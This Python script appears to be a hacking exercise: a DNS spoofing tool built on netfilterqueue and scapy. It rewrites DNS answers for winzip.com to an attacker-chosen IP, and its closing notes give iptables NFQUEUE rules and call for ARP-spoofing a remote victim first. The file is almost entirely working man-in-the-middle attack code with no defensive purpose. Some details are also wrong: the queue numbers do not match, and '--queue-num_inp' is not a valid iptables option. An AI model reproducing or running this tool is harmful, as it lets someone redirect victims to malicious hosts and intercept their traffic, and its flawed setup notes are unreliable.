import netfilterqueue
import optparse
import scapy.all as scapy


def spoof_ip():
    target_input = optparse.OptionParser()
    target_input.add_option("-w", "--web_ip", dest="target_web_page",
                            help="Enter the ip to spoof the target.")
    (options, arguments) = target_input.parse_args()

    if not options.target_web_page:
        print("Enter the ip. \n --help for more")

    return options.target_web_page


def process_packet(packet):
    target_ip = spoof_ip()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "winzip.com" in str(qname):
            print("[+] Spoofing target")

            # answer = scapy.DNSRR(rrname=qname, rdata="192.168.42.128")

            answer = scapy.DNSRR(rrname=qname, rdata=target_ip)  # Take spoof ip as an input
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(2, process_packet)

try:
    queue.run()

except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected")
    print("[-] Quiting")

"""
remote computer -> iptables -I FORWARD -j NFQUEUE --queue-num_inp 0
                -> ARP spoofing for that compuet ip

self computer -> iptables -I OUTPUT -j NFQUEUE --queue-num_inp 0
              -> iptables -I INPUT -j NFQUEUE --queue-num_inp 0


"""
